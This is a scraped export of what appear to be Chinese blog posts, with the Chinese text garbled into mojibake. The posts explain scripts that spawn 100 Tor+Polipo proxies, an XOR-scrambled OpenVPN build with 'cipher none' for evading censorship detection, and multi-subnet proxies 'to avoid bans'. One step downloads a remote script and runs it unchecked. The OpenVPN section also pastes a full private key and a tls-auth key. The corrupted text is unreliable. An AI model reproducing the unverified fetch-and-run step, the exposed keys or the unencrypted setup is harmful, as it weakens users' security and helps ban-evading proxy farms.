è¯´è€å®è¯ï¼Œ10ä¸ªIPæ²¡å¿…è¦ï¼Œä¸€ä¸ªIPè¶³å¤Ÿäº†ï¼Œç”¨Tor+polipoå³å¯ã€‚\nTorçš„éƒ¨åˆ†ï¼Œç”¨å®Œå…¨å‘½ä»¤è¡ŒåŠ å‚æ•°å¯åŠ¨ï¼š\n$ mkdir -p /tmp/tor10001/data $ /usr/bin/tor SOCKSPort 10001 CONTROLPort 20001 DATADirectory /tmp/tor10001/data Polipoçš„éƒ¨åˆ†ï¼Œä¹Ÿå®Œå…¨ç”¨å‘½ä»¤è¡Œå¯åŠ¨ï¼š\n$ polipo socksParentProxy=\u0026#34;127.0.0.1:10001\u0026#34; proxyPort=30001 proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; ç»„åˆèµ·æ¥ï¼Œå¼„æˆä¸€ä¸ªè„šæœ¬ï¼š\n$ mkdir -p /tmp/tor10002/data $ nohup /usr/bin/tor SOCKSPort 10002 CONTROLPort 20002 DATADirectory /tmp/tor10002/data \u0026amp; $ nohup polipo socksParentProxy=\u0026#34;127.0.0.1:10002\u0026#34; proxyPort=30002 proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; \u0026amp; å¼€100ä¸ªTor+Polipoï¼š\n#!/bin/bash a=10001 b=20001 c=30001 n=10100 echo \u0026#34;Start multiple Tors+polipo\u0026#34; echo \u0026#34;Begin port \u0026#34; $a echo \u0026#34;End port \u0026#34; $n while [ $a -le $n ] do echo \u0026#34;Start Tor on port\u0026#34; $a mkdir -p /tmp/tor$a/data nohup /usr/bin/tor SOCKSPort $a CONTROLPort $b DATADirectory /tmp/tor$a/data \u0026amp; echo \u0026#34;Start Polipo on port\u0026#34; $c nohup polipo socksParentProxy=\u0026#34;127.0.0.1:$a\u0026#34; proxyPort=$c proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; \u0026amp; a=$(($a + 1)) b=$(($b + 1)) c=$(($c + 1)) done é€šæ€Tor+Polipoçš„è„šæœ¬\n#!/bin/bash ps aux | grep tor | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 ps aux | grep polipo | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 ","permalink":"https://rendoumi.com/posts/20240124-freelancer_1/","summary":"\u003cp\u003eFreelancerä¸Šæœ‰ä¸ªproxy setupçš„ä»»åŠ¡ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eProject Description  \r\nHi, I would like to create a new VPS proxy server with multiple IPs on the same VPS.  \r\nAre you able to that?  \r\nWhat OS do you prefer?  \r\n- I have 10 ips.\r\n- I want them to be as much anonymous as you can.\r\n- I would have an Username and Password as auth, but if needed the possibility to have an IP authentication too.\r\nMy budget is: ~20$  \r\nThank you in advance.  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¯´è€å®è¯ï¼Œ10ä¸ªIPæ²¡å¿…è¦ï¼Œä¸€ä¸ªIPè¶³å¤Ÿäº†ï¼Œç”¨Tor+polipoå³å¯ã€‚\u003c/p\u003e","title":"Freelancerçš„ä»»åŠ¡ä¹‹ä¸€ï¼šå¤šIPå¤šé‡åŒ¿åä»£ç†åŠ è®¤è¯"},{"content":"è¿™ä¸ªå¾ˆå¥‡æ€ªæ’’ï¼Œä»”ç»†æŸ¥äº†ä¸‹ï¼ŒåŸä½œè€…æ˜¯è¿™ä¹ˆè¯´çš„ï¼š\nI have created a patch which introduces some forms of scrambling to the packet payload of any OpenVPN connection. I have been successfully using the patch with Iranian and Chinese users for some time now. çœ‹æ¥ä¼Šæœ—ä¹Ÿæ¯”è¾ƒç³Ÿç³•å•Šã€‚\næ— è¯­ï¼Œé‰´äºåœ¨æ£®åæ˜“è…¾æ— æ³•å»ºopenvpnï¼Œä¸çŸ¥é“æ˜¯ç›´æ¥å°äº†1194çš„udpç«¯å£ï¼Œè¿˜æ˜¯ä»åè®®ä¸Šå°æ‰äº†openvpnï¼Œæ€»ä¹‹ï¼Œéƒ½å¾ˆshitã€‚\nç®€å•è¯´å°±æ˜¯å¯¹openvpnåè®®è¿›è¡Œäº†æ··æ·†ï¼Œå¤šäº†ä¸€ä¸ªé…ç½®é¡¹ï¼š\nscramble å‚æ•° scramble reverse #å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡Œåè½¬ï¼Œé€šå¸¸è¿™ä¸€å¥å°±å·²ç»å¯ä»¥ç»•è¿‡Chinaå’ŒIrançš„æ£€æµ‹æœºåˆ¶äº† scramble xorptrpos #å¯¹ä¼ è¾“çš„packageä¸­çš„æœ‰æ•ˆæ•°æ®è¿›è¡Œxorè¿ç®— scramble obfuscate password #æ›´å¼ºçƒˆçš„åŠ å¯†ã€‚åè½¬+xor+å¯†ç ä¸‰ç§æ–¹å¼å…¨ç”¨ä¸Š. \u0026#34;password\u0026#34; æ˜¯ä½ è®¾å®šçš„å¯†ç  ç”¨ä¸Šè¿™ä¸ªé…ç½®é¡¹åï¼Œå»ºè®®è®¾ç½®cipher none, å› ä¸ºå¦‚æ­¤è¿™èˆ¬ä»¥åï¼Œæ²¡æœ‰å¿…è¦å†åˆ¶å®šcipheræ–¹å¼äº†ã€‚å¦å¤–ï¼Œç”¨cipherä¼šæ¶ˆè€—cpuï¼Œè€Œé‡‡ç”¨scrambleæ¶ˆè€—cpuçš„ç¨‹åº¦æ¯”cipherä½ã€‚ æ­ä¸€ä¸ªè¯•è¯•çœ‹ è¿™é‡Œé‡‡ç”¨çš„æ˜¯openvpn 2.4.4ç‰ˆæœ¬å’Œç›¸åº”çš„patch\nä¸‹è½½ï¼š\n2.4.4.zip master.zip #centos yum -y install unzip yum -y groupinstall \u0026#34;development tools\u0026#34; #ubuntu apt update apt install build-essential unzip -x 2.4.4.zip unzip -x master.zip åº”ç”¨è¡¥ä¸ï¼š\ncd openvpn-release-2.4/ git apply ../openvpn_xorpatch-master/openvpn_xor.patch å®‰è£…ä¾èµ–åŒ…å¹¶ç¼–è¯‘ï¼š\n#cetnos yum install -y openssl-devel lz4-devel net-tools lzo-devel pam-devel #ubuntu apt install autoreconf liblzo2-dev libpam0g-dev autoreconf -i -v -f ./configure --prefix=/export/servers/openvpn make make install å®‰è£…easy-rsa-3.0ï¼Œä¸å¾—ä¸å‡»èŠ‚å«å¥½å•Šï¼Œeasy-rsa 3.0æ¯”2.0è¿›åŒ–å¤šäº†ï¼Œå°±ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿè½»çœå¤šäº†ï¼š\nwget http://img.rendoumi.com/soft/vpn/easy-rsa.zip unzip -x easy-rsa.zip å»ºç«‹openvpné…ç½®æ–‡ä»¶å¤¹\nmkdir -p /etc/openvpn/conf cp -r easy-rsa-master/easyrsa3/* /etc/openvpn çœ‹çœ‹æ–°ç‰ˆeasy-rsa-3.0éƒ½æœ‰ä»€ä¹ˆå‘½ä»¤\ncd /etc/openvpn ./easyrsa Easy-RSA 3 usage and overview USAGE: easyrsa [options] COMMAND [command-options] A list of commands is shown below. To get detailed usage and help for a command, run: ./easyrsa help COMMAND For a listing of options that can be supplied before the command, use: ./easyrsa help options Here is the list of commands available with a short syntax reminder. Use the \u0026#39;help\u0026#39; command above to get full usage details. init-pki build-ca [ cmd-opts ] gen-dh gen-req \u0026lt;filename_base\u0026gt; [ cmd-opts ] sign-req \u0026lt;type\u0026gt; \u0026lt;filename_base\u0026gt; build-client-full \u0026lt;filename_base\u0026gt; [ cmd-opts ] build-server-full \u0026lt;filename_base\u0026gt; [ cmd-opts ] revoke \u0026lt;filename_base\u0026gt; gen-crl update-db show-req \u0026lt;filename_base\u0026gt; [ cmd-opts ] show-cert \u0026lt;filename_base\u0026gt; [ cmd-opts ] import-req \u0026lt;request_file_path\u0026gt; \u0026lt;short_basename\u0026gt; export-p7 \u0026lt;filename_base\u0026gt; [ cmd-opts ] export-p12 \u0026lt;filename_base\u0026gt; [ cmd-opts ] set-rsa-pass \u0026lt;filename_base\u0026gt; [ cmd-opts ] set-ec-pass \u0026lt;filename_base\u0026gt; [ cmd-opts ] DIRECTORY STATUS (commands would take effect on these locations) EASYRSA: . PKI: /etc/openvpn/pki ç®€å•æ˜äº†ï¼Œä¸€ç›®äº†ç„¶ï¼Œæ¥å§ï¼Œä¸€æ°”å‘µæˆ\ncd /etc/openvpn ./easyrsa init-pki ./easyrsa --batch build-ca nopass ./easyrsa --batch build-server-full server nopass ./easyrsa --batch build-client-full client1 nopass ./easyrsa gen-dh ä»€ä¹ˆéƒ½ä¸ç”¨ç®¡ï¼Œå°±å…¨å¼„å¥½äº†ï¼Œæ¯”èµ·easy-rsa 2.0ä¸€å †è„šæœ¬ï¼Œä¿®æ”¹varsï¼Œçœäº‹å¤šäº†ï¼ï¼ï¼\nå‡†å¤‡serverç«¯çš„é…ç½®æ–‡ä»¶ï¼š\ncd /etc/openvpn/ cp pki/ca.crt pki/dh.pem pki/private/client1.key pki/private/server.key pki/issued/* /etc/openvpn/conf cd /etc/openvpn/conf /export/servers/openvpn/sbin/openvpn --genkey --secret ta.key è¿™æ ·/etc/openvpn/confä¸‹å°±ä¼šæœ‰7ä¸ªæ–‡ä»¶\nca.crt server.key client1.key client1.crt dh.pem server.crt ta.key å‡†å¤‡ä¸ªæ¨¡æ¿ï¼š\ncat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/openvpn/conf/server.conf port 1194 proto udp dev tun server 10.8.0.0 255.255.255.0 scramble obfuscate fuckfuckfuck ca /etc/openvpn/conf/ca.crt cert /etc/openvpn/conf/server.crt key /etc/openvpn/conf/server.key tls-auth /etc/openvpn/conf/ta.key 0 key-direction 0 dh /etc/openvpn/conf/dh.pem cipher none #push \u0026#34;route 172.16.0.0 255.255.0.0\u0026#34; client-to-client comp-lzo persist-key persist-tun user nobody group nobody ifconfig-pool-persist /etc/openvpn/conf/ipp.txt status /var/log/openvpn-status.log log /var/log/openvpn.log log-append /var/log/openvpn.log keepalive 5 30 verb 3 EOF å¯åŠ¨serverç«¯\n/export/servers/openvpn/sbin/openvpn --config /etc/openvpn/server.conf --daemon å‡†å¤‡å®¢æˆ·ç«¯æ–‡ä»¶\ncat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/openvpn/conf/client1.ovpn client dev tun proto udp remote change_this_to_server_address 1194 scramble obfuscate fuckfuckfuck resolv-retry infinite nobind persist-key persist-tun user nobody group nogroup ca ca.crt cert client1.crt key client1.key tls-auth ta.key 1 remote-cert-tls server key-direction 1 cipher none comp-lzo keepalive 5 30 verb 3 EOF åˆå¹¶å‡ºä¸€ä¸ªå•ç‹¬çš„å®¢æˆ·ç«¯æ–‡ä»¶ æ³¨æ„merge.shé‡Œé¢æ–‡ä»¶çš„é…ç½®ï¼š\nca=\u0026#34;ca.crt\u0026#34; cert=\u0026#34;client1.crt\u0026#34; key=\u0026#34;client1.key\u0026#34; tlsauth=\u0026#34;ta.key\u0026#34; ovpndest=\u0026#34;client1.ovpn\u0026#34; cd /etc/openvpn/conf wget http://img.rendoumi.com/soft/vpn/merge.sh chmod 755 merge.sh ./merge.sh è¿™æ ·å°±ä¼šåˆå¹¶å‡ºä¸€ä¸ªclient1.ovpnå®¢æˆ·ç«¯è¿æ¥æ–‡ä»¶æ¥ï¼Œå…¨éƒ¨åˆä¸€ï¼Œå…¶å®server.confä¹Ÿå¯ä»¥æŠŠæ‰€æœ‰ä¸œè¥¿åŒ…æ‹¬è¿›å»\nclient dev tun proto udp remote change_this_to_server_address 1194 scramble obfuscate fuckfuckfuck resolv-retry infinite nobind persist-key persist-tun remote-cert-tls server cipher none comp-lzo verb 3 key-direction 1 \u0026lt;ca\u0026gt; -----BEGIN CERTIFICATE----- MIIDKzCCAhOgAwIBAgIJAOG5arbs5t9RMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV BAMTCENoYW5nZU1lMB4XDTE4MDMyODAzNDkyMloXDTI4MDMyNTAzNDkyMlowEzER MA8GA1UEAxMIQ2hhbmdlTWUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB AQDMOUuQg49OstGbfPLjTgzwb5YBmBeVxyF3+5jmKbgPXujZ3dvdBwxaslVUwre6 XsMUBz3vbB7Kf1BBDHe2jt60p2x2O+ptTb3rRhTPLhdhd9C3HUhwkNYc7jv1+ua3 sUlwiYikltKhXGVU3e/XYB+Aiw63mem4ex5T4kJ/KIKoulGhUsaOl9JtPPKbeIlV BgUzBLHNt/9bY7r7m2Fh0VmbD5p5YMZEGrg+WX0qzT4wKD/734VdxuAoFwd7as6s CH73w0ykscV7evUJEaNu1keTqgqG5SuE3HzQ1cmWSSeF84gUes+l2JAivpQ/XTkF wdLnq2caXVTMDF8t/Y1e8JfVAgMBAAGjgYEwfzAdBgNVHQ4EFgQU+SKBqluAW6hQ p8y9Q22ZBhkTw5IwQwYDVR0jBDwwOoAU+SKBqluAW6hQp8y9Q22ZBhkTw5KhF6QV MBMxETAPBgNVBAMTCENoYW5nZU1lggkA4blqtuzm31EwDAYDVR0TBAUwAwEB/zAL BgNVHQ8EBAMCAQYwDQYJKoZIhvcNAQELBQADggEBAL9ZqyMSrrJ2ss/5pQhUBw71 nmjeT8DPg7Optiq02oAPdIo06WdJ77Y+mFypGKw8uUHp/h0mL5wBr6NBYbdw+5Lc vv4tCpOzzNW7PJngJWilIdvL1W+y3i3/AolSs7jAradaOQOpI23tOeQAQUmwchmt hvgKH8kyIWlOzxGIHdG9Spv8Oi1X6dwD0t4ddaNqcnCbyC2cBX4TvlXeVixMdBLY xq/5+G6dlJhaUzD4lG9Co7PTctwOFzKIP+mCrhLFCh7v5L6HCqL5ZLI7bWYTy0rm XURbleynyld95FKuul5YFRyb/j+I8iBd3Sw9TWhVuqKb4JX9n6zB1FxkNUX1r4g= -----END CERTIFICATE----- \u0026lt;/ca\u0026gt; \u0026lt;cert\u0026gt; -----BEGIN CERTIFICATE----- MIIDRTCCAi2gAwIBAgIRALV3i3gqfdbfWujom75JgiwwDQYJKoZIhvcNAQELBQAw EzERMA8GA1UEAxMIQ2hhbmdlTWUwHhcNMTgwMzI4MDg1NjQ5WhcNMjgwMzI1MDg1 NjQ5WjASMRAwDgYDVQQDEwdjbGllbnQxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A MIIBCgKCAQEAqXq+oaXFyp24OBuXrAPRxnyg4t7eKl7jh4EmL+T2xnQ5qZfwDBz/ 0mI6MDgqPFDC8DWeO3iJZlNlIBNrHpza2kj53Fw7UB1yyi9fArt3Luj2HdjqXyDw yLTX6dVV/m+dP7Jq1OnnpaG7gbkjKaaS8inc79v1ismJK9ZAwaiQobv1T3Th7eL+ nrKfjCJ/gevHfXocR7PuEe1CwyUEp124Z5fhq7S6JAgmt3WbiBVPIg5lp/pCyfbh K6z1Y5abPVCAJXTqgbaYBLIorO88wn5zn5D6ZFXDTdo3gJgQSlbax6AN5CqyK+Qi U2mF7Cf8+Ma+0eLbOFM62kulaqXX+uUojwIDAQABo4GUMIGRMAkGA1UdEwQCMAAw HQYDVR0OBBYEFJaAOw/CP8O/dnncm/VwlPow8kM9MEMGA1UdIwQ8MDqAFPkigapb gFuoUKfMvUNtmQYZE8OSoRekFTATMREwDwYDVQQDEwhDaGFuZ2VNZYIJAOG5arbs 5t9RMBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQEAwIHgDANBgkqhkiG9w0B AQsFAAOCAQEAmU9Y+dP4PH0eh4KMNW0QhseN0t0CK1Nzyu3hNcuIntns3J3VpJ1u 1WKA16mnH8nLu2hNUKnWkOnuvPnwXIprWdg9Zvmct/QEtys4THnG3+5Ni7wVexhU lNU0qZcwGNwqQiZBrHcZZq6pAKtrAH0kD6/l5qCeScPrDIy6w3eFfGa/AJcEBNEN Wruj3hUQxRsv35XFfxEROaklfuLrfr0U1OlWDySSGMQafXjZCmLdxRb5IkI90255 t3yksT9Bj7v/2n++ttlQTH0FK5zY7Uz76A21idiRCw/aVeXvJkafYqi+o/9kkVJh w+Q9Lm+AKGkaaMgz0dt0cmVZgHsnyzOzhQ== -----END CERTIFICATE----- \u0026lt;/cert\u0026gt; \u0026lt;key\u0026gt; -----BEGIN PRIVATE KEY----- MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCper6hpcXKnbg4 G5esA9HGfKDi3t4qXuOHgSYv5PbGdDmpl/AMHP/SYjowOCo8UMLwNZ47eIlmU2Ug E2senNraSPncXDtQHXLKL18Cu3cu6PYd2OpfIPDItNfp1VX+b50/smrU6eelobuB uSMpppLyKdzv2/WKyYkr1kDBqJChu/VPdOHt4v6esp+MIn+B68d9ehxHs+4R7ULD JQSnXbhnl+GrtLokCCa3dZuIFU8iDmWn+kLJ9uErrPVjlps9UIAldOqBtpgEsiis 7zzCfnOfkPpkVcNN2jeAmBBKVtrHoA3kKrIr5CJTaYXsJ/z4xr7R4ts4UzraS6Vq pdf65SiPAgMBAAECggEAKwlSUzYHTfZTC1xmXXXy1RZcvH+fpt7FpGk1S0A3Mhnd cqV0fX73r3LmF8yLXRmdBuZ2sd9f9K4EpeqIbxOht4CEgmKhZSy1M4Zn+AemsjDS Hq4whcuVmUHi+iwEVEH/imdCHaLwAe1Z8g0TUsZL1lavFfGjHoUi4hDcDNFDOO5Z +gOL+ZLtAwCibcdTgdW7xXZMY6U4Mg4f7VggFqpuxe90ebaa1DHUYOm4XFQdrEOg KtC93wkFKuz9fXvyCyjk5t3oXO3EQvLSsm0W1LhBYkdZp8fUmkgh7Lz2J/h7/qK9 FYxbkvbFE7Zl1FE0g4kYNgMRq94Dy7IPhrbCXh1XUQKBgQDXYJt0KlfNdIQrZVsg kGkvE9eeEw3XhRCzsKIqnD3DkvkgowD6kpq9rU3tTg1x830QbfPu9L5cQEt5Hlsg zzCWKsjvC8Gnblz4ctvUvl+o9jbIKBf1aSykGGLZqB8rITd+gY8jcRDE637pxmKO HHhN0hjXyhSpjSCeWfvHHt4OdQKBgQDJcfq3nVmO6JBjn8Csywi9OHhodI4IKcLH EuEoJR0akv5l07UQGZXjkT60UUg5uAIU+z/Bk7UOErJckxvMCLzg9/O1ZRCEppdP GKMP4DM/xxdf37zEifBtFzBG9LCoIEJqRwzhaD7jyEg8jEv9G+ege/Bp5W9WDS2P 9bWWF3DCcwKBgHN+0t4QdtUuTlIXIC7uQfmE4nNaNGoGaVZyugOvlU9zWTUvNC8q vuBINymyWXNp5v8Qd2cEx7Agqlhg9u05LgzZFLdbzpVCkYiJz2jeTd4FaosbNP3d UJsOmLOvfEdcoK2uPFv9Hcj7oCssv10F112j9L6DF2F01LEV//ZfjyShAoGAEHjo hoEwZJYx0GOszrRfh5GJjwkQ4CwCCGNL1AuM4LJqaQsxwBpHfm9PEFGhNU8NpIeT BBI++OKggR9qY3nHcCH2ZLvZ6O7yan5aPx8XMbzm9WkHN48MAO+ne/XgSC8zHxum OvxaQCgNeB4EzLKucxoPY6lmPEQhmKb/7UEHcG8CgYEAxhtREMFAL0+uDAJ72WLx qCEM0x9zet5DOLOqxUSlBJILAwwcgGA1DXdjMej/BxZbIHgZANZ3Gj+k3D5m4GQl Pe3DtI3HBLbVH8DeyZC6fJxjaNi16/mbD6puRpPs+w0D2pQwJr6k2uR8+G883RW5 4vcpovBkutR5n1M09M3DyeU= -----END PRIVATE KEY----- \u0026lt;/key\u0026gt; \u0026lt;tls-auth\u0026gt; -----BEGIN OpenVPN Static key V1----- 79a3add18ba52b97045de864939a9a9e a0a07657bce8a0210c41b7d83d48ec48 81c89db3dbec8b4bfc13424d3813711d f34a4770ebeaf181eeffcd3f38cea425 78006c5b7506a5d9dcb0079daa3b3412 5434af9df560f3a0d29bc8b333479943 0f5839fee349f2079d03c9d31d6e2bf4 26a32180c8e4f6c1579acbfef7596335 a4147c64395ff77927ebe02f2a757d17 a2df3245670c1eff89f9e1025dbc4b07 8d3fcfaf4fbad44d9becf17f5d6d34ee 50d616fb58bc0e29da54a934353701a9 973df9b1f9041706642ff8ed00b24462 5cb52768dd5472093855d0e8fa5b8762 cca2aa48bda3d8964a19842fbf9d2081 ff0075295379f663129723ee9319a789 -----END OpenVPN Static key V1----- \u0026lt;/tls-auth\u0026gt; okï¼ŒæŠŠè¿™ä¸ªclient1.ovpnæ‹·è´å‡ºæ¥ï¼Œå‡†å¤‡å¼„åˆ°windowsä¸Šç”¨\nåœ¨windowsä¸Šä¸‹è½½åŸå§‹çš„openvpn-gui:\nhttp://img.rendoumi.com/soft/vpn/openvpn-install-2.4.4-I601.exe ç„¶åä¸‹è½½å¯¹åº”çš„openvpnä¸»æ–‡ä»¶\nhttps://github.com/lawtancool/openvpn-windows-xor/releases å…ˆå®‰è£…å¥½openvpnï¼Œç„¶ååˆ°\nC:\\Program Files\\OpenVPN\\config æŠŠclient1.ovpnæ”¾è¿›å»\nç„¶åä»¥ç®¡ç†å‘˜èº«ä»½å¯åŠ¨æ¡Œé¢ä¸Šçš„OpenVPN-GUIï¼Œå³é”®ç‚¹å‡»è¿æ¥å°±å¯ä»¥è¿ä¸Šäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240124_freelancer_2/","summary":"\u003cp\u003eè¿™ä¸ªå¾ˆå¥‡æ€ªæ’’ï¼Œä»”ç»†æŸ¥äº†ä¸‹ï¼ŒåŸä½œè€…æ˜¯è¿™ä¹ˆè¯´çš„ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eI have created a patch which introduces some forms of scrambling to the packet payload of any OpenVPN connection.  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eI have been successfully using the patch with Iranian and Chinese users \u003cspan class=\"k\"\u003efor\u003c/span\u003e some \u003cspan class=\"nb\"\u003etime\u003c/span\u003e now.  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹æ¥ä¼Šæœ—ä¹Ÿæ¯”è¾ƒç³Ÿç³•å•Šã€‚\u003c/p\u003e\n\u003cp\u003eæ— è¯­ï¼Œé‰´äºåœ¨æ£®åæ˜“è…¾æ— æ³•å»ºopenvpnï¼Œä¸çŸ¥é“æ˜¯ç›´æ¥å°äº†1194çš„udpç«¯å£ï¼Œè¿˜æ˜¯ä»åè®®ä¸Šå°æ‰äº†openvpnï¼Œæ€»ä¹‹ï¼Œéƒ½å¾ˆshitã€‚\u003c/p\u003e\n\u003cp\u003eç®€å•è¯´å°±æ˜¯å¯¹openvpnåè®®è¿›è¡Œäº†æ··æ·†ï¼Œå¤šäº†ä¸€ä¸ªé…ç½®é¡¹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escramble å‚æ•°  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escramble reverse \u003cspan class=\"c1\"\u003e#å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡Œåè½¬ï¼Œé€šå¸¸è¿™ä¸€å¥å°±å·²ç»å¯ä»¥ç»•è¿‡Chinaå’ŒIrançš„æ£€æµ‹æœºåˆ¶äº†  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escramble xorptrpos \u003cspan class=\"c1\"\u003e#å¯¹ä¼ è¾“çš„packageä¸­çš„æœ‰æ•ˆæ•°æ®è¿›è¡Œxorè¿ç®—  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escramble obfuscate password \u003cspan class=\"c1\"\u003e#æ›´å¼ºçƒˆçš„åŠ å¯†ã€‚åè½¬+xor+å¯†ç ä¸‰ç§æ–¹å¼å…¨ç”¨ä¸Š. \u0026#34;password\u0026#34; æ˜¯ä½ è®¾å®šçš„å¯†ç \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç”¨ä¸Šè¿™ä¸ªé…ç½®é¡¹åï¼Œå»ºè®®è®¾ç½®cipher none, å› ä¸ºå¦‚æ­¤è¿™èˆ¬ä»¥åï¼Œæ²¡æœ‰å¿…è¦å†åˆ¶å®šcipheræ–¹å¼äº†ã€‚å¦å¤–ï¼Œç”¨cipherä¼šæ¶ˆè€—cpuï¼Œè€Œé‡‡ç”¨scrambleæ¶ˆè€—cpuçš„ç¨‹åº¦æ¯”cipherä½ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ­ä¸€ä¸ªè¯•è¯•çœ‹ è¿™é‡Œé‡‡ç”¨çš„æ˜¯openvpn 2.4.4ç‰ˆæœ¬å’Œç›¸åº”çš„patch\u003c/p\u003e\n\u003cp\u003eä¸‹è½½ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"2.4.4.zip\"\u003e2.4.4.zip\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"master.zip\"\u003emaster.zip\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#centos \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install unzip  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y groupinstall \u003cspan class=\"s2\"\u003e\u0026#34;development tools\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ubuntu\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install build-essential\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunzip -x 2.4.4.zip  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunzip -x master.zip  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåº”ç”¨è¡¥ä¸ï¼š\u003c/p\u003e","title":"Freelancerä»»åŠ¡ä¹‹äºŒï¼šå»ºä¸€ä¸ªscramble obfuscated opevpn"},{"content":"ä»»åŠ¡çš„è¦æ±‚æ˜¯ï¼š\nâ€¢ Multiple subnets to avoid bans â€¢I need the proxies to have the ability of User:Pass â€¢Proxy needs to be Residential IPv6\nè¿˜ç»™å‡ºäº†ä¸€ä¸ªå‚è€ƒï¼š https://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/\næ©ï¼Œæ¯”è¾ƒæœ‰æ„æ€ã€‚æŒ‰ç…§ä»–ç»™çš„è¿æ¥ï¼š\nç¬¬ä¸€æ­¥å» LowEndBox.com æˆ–è€… Webhostingtalk.com å»æ‰¾ä¸€å®¶å£ç¢‘æ¯”è¾ƒå¥½ï¼Œè€Œä¸”èƒ½æä¾›é™„åŠ ipçš„VPSä¾›åº”å•†ï¼Œé€šå¸¸é™„åŠ ä¸€ä¸ªIPæ˜¯1$ä¸€ä¸ªæœˆã€‚\nç¬¬äºŒæ­¥ä¹°ä¸ªVPSï¼Œé…ç½®æ˜¯1Gå†…å­˜ï¼Œ1ä¸ªå†…æ ¸ï¼Œ100Må¸¦å®½ï¼Œå¹¶ä¸”é™„åŠ 10ä¸ªIPã€‚\nè¿™æ ·çš„VPSä¸€èˆ¬æ˜¯5$ä¸€ä¸ªæœˆï¼Œ10$10ä¸ªipä¸€ä¸ªæœˆï¼Œåˆè®¡15$ä¸€ä¸ªæœˆï¼Œ100å…ƒäººæ°‘å¸ï¼Œè¿™æ ·ä½ å°±æœ‰11ä¸ªIPå¯ç”¨äº†ã€‚\næŒ‰è¿™ä¸ªä»»åŠ¡çš„è¦æ±‚ï¼Œéœ€è¦Multiple subnetï¼Œä½ å°±ä»è¿™å®¶ä¾›åº”å•†çš„ä¸åŒåœ°ç‚¹å¤šä¹°å‡ å°ï¼Œæ¯”å¦‚æ´›æ‰çŸ¶1å°ï¼Œå¾·å·1å°ï¼Œçº½çº¦1å°ï¼Œç„¶åæ¯å°é™„åŠ 